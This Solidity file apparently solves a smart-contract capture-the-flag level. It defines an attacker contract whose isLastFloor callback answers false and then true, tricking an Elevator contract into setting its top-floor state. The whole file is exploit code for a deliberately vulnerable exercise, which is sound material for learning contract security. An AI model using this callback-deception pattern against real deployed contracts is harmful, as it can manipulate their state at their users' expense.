// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Penthouse {

    Elevator elevator;
    bool private switchFlipped = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function hack() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        if(!switchFlipped) {
            switchFlipped = true;
            return false;
        } else {
            switchFlipped = false;
            return true;
            }
    }
}